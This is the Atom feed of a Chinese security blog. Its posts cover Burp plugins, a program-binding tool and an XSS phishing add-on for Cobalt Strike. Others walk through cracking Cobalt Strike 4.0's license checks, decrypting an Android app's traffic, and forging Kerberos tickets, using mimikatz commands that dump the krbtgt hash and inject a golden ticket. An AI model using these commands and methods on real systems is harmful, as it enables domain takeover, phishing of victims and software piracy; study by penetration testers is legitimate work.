<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://thekingofduck.github.io</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2020-06-27T16:51:20.218Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://thekingofduck.github.io"/>
    <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://thekingofduck.github.io/images/avatar.png</logo>
    <icon>https://thekingofduck.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[Copy2Yaml:一键生成yaml poc]]></title>
        <id>https://thekingofduck.github.io/post/copy2yaml/</id>
        <link href="https://thekingofduck.github.io/post/copy2yaml/">
        </link>
        <updated>2020-06-27T16:38:24.000Z</updated>
        <content type="html"><![CDATA[<p>初次使用JavaFX，不得不说体验比swing强太多了。</p>
<p>开发过程忘记了burp是swing画的GUI，调试卡了好久，难受啊。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1593276055852.jpg" alt="" loading="lazy"></figure>
<p>对标xray的poc来开发的，虽然兼容但是不是写给xray用的。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1593276097179.jpg" alt="" loading="lazy"></figure>
<p>写了支持终端模式，burp插件模式，在或者直接打开复制粘贴数据包也是可以的，又是写bug的一天。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MatryoshkaDollTool-一款程序捆绑工具]]></title>
        <id>https://thekingofduck.github.io/post/MatryoshkaDollTool/</id>
        <link href="https://thekingofduck.github.io/post/MatryoshkaDollTool/">
        </link>
        <updated>2020-05-23T15:33:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="what">WHAT</h3>
<p>一款程序捆绑工具，取名MatryoshkaDollTool，也叫俄罗斯套娃工具。</p>
<p>开源这个只有基础捆绑功能的版本，给套娃程序添加自启以及加密功能的版本哪天高兴了就开源。</p>
<h3 id="why">WHY</h3>
<p>找不到好用的没后门的捆绑工具所以自己动手写了。</p>
<h3 id="how">HOW</h3>
<figure data-type="image" tabindex="1"><img src="https://github.com/TheKingOfDuck/MatryoshkaDollTool/blob/master/img/screenshot.png" alt="" loading="lazy"></figure>
<h3 id="where">WHERE</h3>
<p>成品在bin目录下。</p>
<h3 id="todo-list">TODO List</h3>
<ul>
<li>把目前的壳变成真壳。</li>
<li>开放添加套娃的自启，加密。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSS-Fishing2-CS：钓鱼自动收杆指南]]></title>
        <id>https://thekingofduck.github.io/post/XSS-Fishing2-CS/</id>
        <link href="https://thekingofduck.github.io/post/XSS-Fishing2-CS/">
        </link>
        <updated>2020-04-19T14:23:30.000Z</updated>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~</p>
<p>项目地址：<a href="https://github.com/TheKingOfDuck/XSS-Fishing2-CS">XSS-Fishing2-CS</a></p>
<p>使用场景：使用xss弹窗提示钓鱼的时候会面临这样一个问题，如果鱼儿已经上线了，页面那边还在不停的弹窗，很容易引起鱼儿怀疑，权限说没就没了。</p>
<h3 id="开发">开发</h3>
<p>cs插件:<br>
<img src="https://thekingofduck.github.io/post-images/fishing2.png" alt="" loading="lazy"></p>
<p>没啥难度，都是照着官方函数库复制...魔性的是我的ubantu死活跑不起来，centos可以...</p>
<p>php端：<br>
<img src="https://thekingofduck.github.io/post-images/fishing1.png" alt="" loading="lazy"><br>
都是基本 语法，基本逻辑，但是遇到一个有趣的弱类型问题：</p>
<pre><code>fwrite(&quot;ips.txt&quot;, &quot;127.0.0.1&quot;);
</code></pre>
<p>写入的结果是127，之后的内容会被当做小点数被忽略掉，所以图中代码那个base64并非我闲着没事做...</p>
<h3 id="使用">使用</h3>
<p>1.将xss.php放到自己的服务器上去并修改第三行的钓鱼Payload。</p>
<p>2.修改xssFisher.cna第4行中的企业微信机器人的密钥，第23行中的xss.php的实际地址。</p>
<p>3.加载cs插件，将xss的Payload插入目标页面。</p>
<h3 id="特点">特点</h3>
<p>1.企业微信上线提示</p>
<p>2.机器上线后立即停止钓鱼的弹窗</p>
<p>3.只停止单个IP的弹窗，其他IP仍然可以继续弹窗，继续上线。</p>
<h3 id="todo">TODO</h3>
<p>1.特定网段上线的问题（？这个场景没有很清楚）<br>
2.内网ip也判断下，避免出现多个目标在一个小的局域网共用一个外网IP，其中一台上线后其他机器就不弹窗了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Java：在Burp中一键生成Java代码]]></title>
        <id>https://thekingofduck.github.io/post/Copy2Java/</id>
        <link href="https://thekingofduck.github.io/post/Copy2Java/">
        </link>
        <updated>2020-04-12T17:18:19.000Z</updated>
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/TheKingOfDuck/Copy2Java">https://github.com/TheKingOfDuck/Copy2Java</a></p>
<h3 id="0x01-初始化">0x01 初始化</h3>
<p>先说说为什么要用Java写这个插件？为什么要生成的是Java的代码。</p>
<p>1.简化安全从业者用Java写web漏洞利用工具的流程。</p>
<p>2.其他语言有插件实现了，生成现成的JAVA代码可在强迫自己使用Java的同时也不会拉低效率。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413020409078.png" alt="image-20200413020409078" loading="lazy"></figure>
<p>代码写完回头再看除了感觉辣鸡没什么太多其他感觉，过程中最麻烦的是画GUI，intellj拖控件有点恶心，eclipse拖好后再复制回intellj即可。在http发包方面目前用过的最方便的是HttpRequest，所以生成的代码依赖也选择它，打包在了项目的lib目录，导入即可。</p>
<h3 id="0x02-加载成功">0x02 加载成功</h3>
<p>使用:</p>
<p>1.加载插件：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021026557.png" alt="image-20200413021026557" loading="lazy"></figure>
<p>2.在burp的repeater中点击Copy2Java菜单：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021159116.png" alt="image-20200413021159116" loading="lazy"></figure>
<p>3.设置是否开启代理【可选】：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021244692.png" alt="image-20200413021244692" loading="lazy"></figure>
<p>默认是不开代理的，没需要的话这部可以跳过。</p>
<p>4.点击步骤3中弹出的窗口中的Copy to clipboard按钮复制代码并粘贴到ide:</p>
<p>添加插件lib目录下的依赖包</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021640508.png" alt="image-20200413021640508" loading="lazy"></figure>
<p>完成</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413022210153.png" alt="image-20200413022210153" loading="lazy"></figure>
<p>如何高效的写一个web相关漏洞的利用工具？</p>
<p>1.新建mvn项目，并将生成的代码复制进来。</p>
<p>2.修改传入的参数，mvn package快速打包。</p>
<p>比用Python写慢？不存在的！</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413022944759.png" alt="image-20200413022944759" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JoomlaCracker: JoomlaCracker CMS 批量爆破工具]]></title>
        <id>https://thekingofduck.github.io/post/JoomlaCracker/</id>
        <link href="https://thekingofduck.github.io/post/JoomlaCracker/">
        </link>
        <updated>2020-04-11T11:44:34.000Z</updated>
        <summary type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
]]></summary>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
<!-- more -->
<p>项目地址：<a href="https://github.com/TheKingOfDuck/JoomlaCracker">https://github.com/TheKingOfDuck/JoomlaCracker</a></p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1586606413161.png" alt="" loading="lazy"></figure>
<p>使用Java开发，自动提取域名要素，debug在115行设置setProxy(true)即可。</p>
<p>一点点心得：<br>
Joomla和Dede性质差不多，99%的洞都是建立在有后台权限/低用户权限的情况下才能利用，谁日谁知道...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[重写一个burpJsEncrypter]]></title>
        <id>https://thekingofduck.github.io/post/ReCode-A-BurpJsEncrypter/</id>
        <link href="https://thekingofduck.github.io/post/ReCode-A-BurpJsEncrypter/">
        </link>
        <updated>2020-03-22T11:05:56.000Z</updated>
        <summary type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
]]></summary>
        <content type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
<!-- more -->
<h3 id="写在前面">写在前面</h3>
<p>先说说这个项目为什么会出现。<br>
c0ny1师傅写的<a href="https://github.com/c0ny1/jsEncrypter">jsEncrypter</a>其实已经能满足日常需求，我本人也是因为这个项目成为c0ny1师傅的&quot;粉丝&quot;的。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848722634917.jpg" alt="-w814" loading="lazy"></figure>
<p>使用过的师傅都知道这个项目依赖于<code>phantomjs</code>,别人我不知道,我自己老是忘记<code>phantomjs</code>的二进制我放哪儿了,而且每次启动啥的都比较麻烦。</p>
<p>在学习Java的过程中了解到官方在<code>JDK1.6</code>添加了新的<code>ScriptEngine</code>类,允许用户直接执行<code>js</code>代码,也就是说调用<code>phantomjs</code>这件事可以,但是没必要。</p>
<h3 id="代码编写">代码编写</h3>
<p>看看核心的实现方法：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33.png" alt="F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F.png" alt="49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F" loading="lazy"></figure>
<p>调用了加载到内存中的<code>burpJsEncrypter</code>函数,代码如下：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/B43B9A52-8508-4CC2-B058-C06AB5D5B79D.png" alt="B43B9A52-8508-4CC2-B058-C06AB5D5B79D" loading="lazy"></figure>
<p>是不是很简单...</p>
<p>再说说开发过程中遇到的最大的坑。</p>
<p>在代码中调试时使用<code>System.getProperty(&quot;user.dir&quot;)</code>获取当前路径时完全OK的,但是加载到内存后再获取就会变成：</p>
<pre><code>/var/folders/tg/z5wcq7jx3s526hykwz0pz2v00000gp/T/burp8120677802571630018.tmp/22js/
</code></pre>
<p>导致遍历<code>js</code>文件一致失败。</p>
<h3 id="如何使用">如何使用</h3>
<p>1.将本项目的js目录下的<code>js</code>文件复制到用户目录下的<code>/burp/jsFile</code>目录:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848732791664.jpg" alt="-w834" loading="lazy"></figure>
<p>文件名咋命名完全无所谓,但是main.js中<code>burpJsEncrypter</code>函数一定要有,需要人工修改的加密逻辑也就是注释中间的内容：</p>
<pre><code>//Java调用的主函数
function burpJsEncrypter(rawPayload){

	var encryptedPayload;


	//===============加密开始=================

	encryptedPayload = hex_md5(rawPayload);

	//===============加密结束=================

	return encryptedPayload;
}
</code></pre>
<p>如上面的代码中的hex_md5函数是加载到内存中的其他js文件中的函数。实战中只需要把页面中所有涉及加密的js文件下载到这个目录即可。</p>
<p>2.设置Payload处理：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/08B84570-D584-4265-9505-27D7F5821E24.png" alt="08B84570-D584-4265-9505-27D7F5821E24" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848737403466.jpg" alt="-w647" loading="lazy"></figure>
<p>选完再开始爆破即可。</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848739154768.jpg" alt="-w973" loading="lazy"></figure>
<p><strong>明文在哪儿看？</strong></p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848741045333.jpg" alt="-w628" loading="lazy"></figure>
<p><strong>支持再Repeater中加密？</strong></p>
<p>选中要加密的字段,右键选择<code>burpJsEncrypter</code>菜单即可。</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848741934886.jpg" alt="-w519" loading="lazy"></figure>
<h3 id="重要提醒">重要提醒</h3>
<p>如果c0ny1师傅那个插件你不会耍的画这个插件你估计也不会耍的,最核心的问题都是找页面中的加密逻辑,然后复制出来运行而已。</p>
<p><strong>即兴开发，Enjoy it~~</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Patch Cobalt Strike 4.0 Stage X64 Bugs]]></title>
        <id>https://thekingofduck.github.io/post/patch-cobalt-strike-40-stage-x64-bugs/</id>
        <link href="https://thekingofduck.github.io/post/patch-cobalt-strike-40-stage-x64-bugs/">
        </link>
        <updated>2020-03-20T09:12:05.000Z</updated>
        <content type="html"><![CDATA[<p>根据出问题的地方<code>Use x64 payload</code>,也就是stage x64生成的exe无法正常运行，跟到:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846865680139.jpg" alt="-w1532" loading="lazy"></figure>
<pre><code>boolean bool1 = DialogUtils.bool(this.options, &quot;x64&quot;);
</code></pre>
<p>如果x64被选择则进入x64生成。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846867392378.jpg" alt="-w1037" loading="lazy"></figure>
<p>通过代码对比会发现调用的函数都没啥区别。</p>
<pre><code>new ArtifactUtils(this.client).patchArtifact(this.stager, &quot;artifact64.exe&quot;, paramString);
</code></pre>
<p>跟过来发现两个<code>patchArtifact</code>的重载方法：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846873782080.jpg" alt="-w827" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846874079370.jpg" alt="-w886" loading="lazy"></figure>
<p>可以发现，整个过程中都没有涉及到传递<code>stage</code>的架构,基本即可以断定和这中间环节没关系了。</p>
<p>继续跟到最终环节:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846898933890.jpg" alt="-w946" loading="lazy"></figure>
<p>细节出来了有没有：</p>
<pre><code>this.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager(&quot;x86&quot;);
</code></pre>
<p>明显官方将<code>stage</code>固定在了x86的,所以把x64的payload写进来自然就不对了。</p>
<p><strong>验证</strong></p>
<p>将86修改为64：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846900913944.jpg" alt="-w843" loading="lazy"></figure>
<p>重新打包运行：</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846902345978.jpg" alt="-w399" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846902520176.jpg" alt="-w845" loading="lazy"></figure>
<p>至于完整的代码怎么调整,就自己考虑咯...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Patch Cobalt Strike 4.0]]></title>
        <id>https://thekingofduck.github.io/post/Patch-Cobalt-Strike-4.0/</id>
        <link href="https://thekingofduck.github.io/post/Patch-Cobalt-Strike-4.0/">
        </link>
        <updated>2020-03-18T22:56:21.000Z</updated>
        <content type="html"><![CDATA[<p>拿到得程序如下:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845637149700.jpg" alt="-w270" loading="lazy"></figure>
<p>压缩包里面存在附一条启动命令：</p>
<pre><code>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar $*
</code></pre>
<p>启动报错：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845638463523.jpg" alt="-w320" loading="lazy"></figure>
<p>这里的说的<code>authorization file</code>明显就是<code>cobaltstrike.auth</code>了</p>
<p>简单搜一下：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845639620558.jpg" alt="-w476" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845665841791.jpg" alt="-w1323" loading="lazy"></figure>
<p>把代码都复制过来，处理下报错：</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845665605145.jpg" alt="-w1586" loading="lazy"></figure>
<p>调用：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845666707405.jpg" alt="-w454" loading="lazy"></figure>
<p>上来就先<code>Invalid authorization file</code>了<br>
明显resources/authkey.pub没有加载过来。</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845671915765.jpg" alt="-w1527" loading="lazy"></figure>
<p>改一下：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845673713054.jpg" alt="-w1176" loading="lazy"></figure>
<p>给出得密钥文件运行到这里就直接return结束了。</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/2F39DF26-A29B-46EA-9F12-129C8D383DEB.png" alt="2F39DF26-A29B-46EA-9F12-129C8D383DEB" loading="lazy"></figure>
<p>既然等于0就结束了，那么把这里得0修改成其他值是不是就可以了？(cs3就是这个破解思路)</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845696379774.jpg" alt="-w316" loading="lazy"></figure>
<p>明显是不得行的。在License方法中有校验：</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845696241758.jpg" alt="-w907" loading="lazy"></figure>
<p>checkLicenseGUI函数得第一个判断就是检测凭证是否有效。值来源于:</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845698414371.jpg" alt="-w277" loading="lazy"></figure>
<p>对应修改一下：</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845737520463.jpg" alt="-w277" loading="lazy"></figure>
<p>然后提示过期:</p>
<figure data-type="image" tabindex="14"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845700315413.jpg" alt="-w483" loading="lazy"></figure>
<p>懒人得做法：直接将这个判断删掉。</p>
<figure data-type="image" tabindex="15"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845706501051.jpg" alt="-w1018" loading="lazy"></figure>
<p>改完就可以直接进加载出UI来了。<br>
<img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E.png" alt="67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E" loading="lazy"></p>
<p>对应的也报了不少错误，并不能正常运行...说明还有多处校验了.</p>
<p>这种动不动就删减代码的破解方式自然不是最佳方案。</p>
<p>回归到：</p>
<figure data-type="image" tabindex="16"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845710917584.jpg" alt="-w904" loading="lazy"></figure>
<p>既然是因为密钥文件不对而导致的这里对比失败,那么直接硬写一条正确的结果进去即可:</p>
<figure data-type="image" tabindex="17"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845712703919.jpg" alt="-w1007" loading="lazy"></figure>
<p>比如：</p>
<figure data-type="image" tabindex="18"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/C4C0BB95-040B-46B2-9C01-DE985474A38A.png" alt="C4C0BB95-040B-46B2-9C01-DE985474A38A" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845720512205.jpg" alt="-w1236" loading="lazy"></figure>
<p>至于这个正确的结果如何拿到，就得感谢有花钱购买以及分享出来的师傅了给予白嫖的机会了。</p>
<figure data-type="image" tabindex="20"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845719954394.jpg" alt="-w955" loading="lazy"></figure>
<p>去除exit暗桩：</p>
<figure data-type="image" tabindex="21"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/1.png" alt="-w955" loading="lazy"></figure>
<p>指纹似乎不存在，listener问题也不存在。</p>
<p>阿门，原谅我没钱只能白嫖了...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[某APP逆向分析与通讯解密]]></title>
        <id>https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/</id>
        <link href="https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/">
        </link>
        <updated>2020-03-17T08:15:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-初始化">0x01 初始化</h3>
<p>年轻人，你是否因看到这样的逆向结果而感到无力？</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/26DD303B-1B36-49D7-9A00-CD772B7556C9.png" alt="" loading="lazy"></figure>
<p>你是否为抓不到包而感觉渗透失去了意义？</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844200931687.jpg" alt="" loading="lazy"></figure>
<p>回归正题，拿到app后初步了解后有下面几个问题：</p>
<ul>
<li>无法抓包</li>
<li>做了加固</li>
<li>通讯加密</li>
</ul>
<p>也是常见APP反篡改的手段了，简单记录一下自己是如何解决这些问题的。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<h4 id="无法抓包">无法抓包</h4>
<p>姿势其实特别多，大部分app的做法都只是反代理，挂vpn是不会拒绝连接的，所以原理上只需要建一个虚拟vpn，使app流量通过这个vpn中转，中间环节解密流量即可。</p>
<p>参考工具<br>
安卓：HttpCanary<br>
苹果：Surge (随便问问有没有师傅组队买surge mac版的授权)</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844205931604.jpg" alt="-w522" loading="lazy"></figure>
<h4 id="做了加固">做了加固</h4>
<p>已知思路有三，</p>
<ul>
<li>脱壳</li>
<li>模拟人工</li>
<li>Hook包中的相关函数直接进行测试</li>
</ul>
<p><strong>脱壳前</strong></p>
<p>脱壳方式/工具也是蛮多的，引用一位师傅说过的话：</p>
<p>1.默念一声&quot;我想脱个壳&quot;。<br>
2.启动 APP。<br>
3.启动 frida-server。<br>
4.python main.py。</p>
<p>默数三秒，脱好了。</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844277956685.jpg" alt="-w880" loading="lazy"></figure>
<p>第二种方式的demo:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844214019846.jpg" alt="-w1225" loading="lazy"></figure>
<p>第三中方式用的人最多，但是比较麻烦，加壳了找函数不方便，不加壳的话直接看代码硬怼就是行。</p>
<p><strong>脱壳后</strong></p>
<p>dex2jar，然后丢进反编译工具</p>
<p>找核心算法其实很容易，比如直接搜一下加密包中header的特征字段</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844290955076.jpg" alt="-w450" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844289523233.jpg" alt="-w1480" loading="lazy"></figure>
<p>跟踪到下面的加密部分：<br>
<img src="https://thekingofduck.github.io/post-images/app1/15844107807705/7C6DE6AD-DEC5-4D38-8D67-BCD2C7873D14.png" alt="7C6DE6AD-DEC5-4D38-8D67-BCD2C7873D14" loading="lazy"><br>
圈起来的为止就是加密的关键点了，点击一下跳过去即可。</p>
<p><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/6F2066C9-F42F-4A59-BBFE-E76001CA679D.png" alt="6F2066C9-F42F-4A59-BBFE-E76001CA679D" loading="lazy"><br>
传入的第一个字符串是需要加密的值，第二个是密钥。密钥可以在上上图中<code>getEncryptAES(paramRequest)</code>跟过去找到：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/388D7F7D-0A24-406E-B0A8-194687ECF9D2.png" alt="388D7F7D-0A24-406E-B0A8-194687ECF9D2" loading="lazy"></figure>
<p>加密算法代码已知，密钥已知，那顺手就可以copy出来自己加解密了：</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/E32C1720-8214-434B-975F-FD9B65E82F9A.png" alt="E32C1720-8214-434B-975F-FD9B65E82F9A" loading="lazy"></figure>
<p>还可以顺手写成burp插件，方便进行漏洞测试：</p>
<p><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/216107F1-9491-4FE8-ACC4-91E5050D5F51.png" alt="216107F1-9491-4FE8-ACC4-91E5050D5F51" loading="lazy"><br>
注册一个右键菜单方便在repeater里面加解密，注册一个payload处理，方便用于爆破之类的操作。</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/77583F6C-3A67-420B-B86A-4E94CFEF0A85.png" alt="77583F6C-3A67-420B-B86A-4E94CFEF0A85" loading="lazy"></figure>
<p>打包一下就可以扔给burp了。</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844303010949.jpg" alt="-w1480" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844304184113.jpg" alt="-w627" loading="lazy"></figure>
<p>一切顺利成章。</p>
<h3 id="0x03-加载成功">0x03 加载成功</h3>
<p>抓包问题可以以微信为测试目标进行尝试，能抓到微信的其他的基本也就都可以抓到了；脱壳不能指望静态脱壳，还是多考虑怎么从内存中提取出dex来；通讯解密/反校验需要java基础，跟着代码构造出正确的数据包即可，看多了其实也就那么几种算法，各个算法加解密的要素了然于心后还原出解密代码不过copy一下，再解决反编译工具的错误即可；写burp插件也是一个样子，看多了就和套模板，背答案做题目差不多。</p>
<p>解决抓包，解决脱壳，再解决通讯加密后就是常规的web测试方法了，一切变得索然无味。</p>
<p><strong>技术交流：</strong></p>
<ul>
<li>WX:TheKingOfGaGaGa</li>
<li>Github:<a href="https://github.com/TheKingOfDuck">https://github.com/TheKingOfDuck</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记五：攻击Kerbroes]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/">
        </link>
        <updated>2020-03-04T10:10:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="用户名遍历">用户名遍历</h3>
<p>回顾Kerbroe的认证流程第一步：</p>
<ul>
<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
</ul>
<p>如果Web测试做的多就知道第一步就存在用户名遍历问题。</p>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583318637446.png" alt="" loading="lazy"></figure>
<h3 id="票据伪造">票据伪造</h3>
<h4 id="golden-ticket">Golden Ticket</h4>
<p>AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的的来的，krbtgt用户的hash也是可以提取出来的，这就意味着ticket是可以自己计算出来的。Golden Ticket就是自己计算TGT去生成的TGS，换在买车票的比喻中就相当于伪造身份证去买票。</p>
<p><strong>Golden Ticket价值和域控相似</strong></p>
<p>伪造条件：</p>
<ul>
<li>Domain SID</li>
<li>Domain name</li>
<li>需要krbtgt用户的hash</li>
<li>用户名随意</li>
</ul>
<p>伪造过程</p>
<p>1.获取krbtgt hash</p>
<pre><code>mimikatz &quot;lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgthash.txt
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583324821594.png" alt="" loading="lazy"></figure>
<p>2.生成票据文件</p>
<pre><code>mimikatz &quot;kerberos::golden /admin:CoolCat /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /krbtgt:b0164177afec62432418903208c1e247 /ticket:golden.kiribi&quot;  &quot;exit&quot;
</code></pre>
<p>其中sid最后一个“-”之后的要去掉，这个很细节。<br>
<img src="https://thekingofduck.github.io/post-images/1583326167707.png" alt="" loading="lazy"></p>
<p>3.将票据文件导入内存</p>
<pre><code>mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt golden.kiribi&quot; &quot;kerberos::list&quot; &quot;exit&quot;
</code></pre>
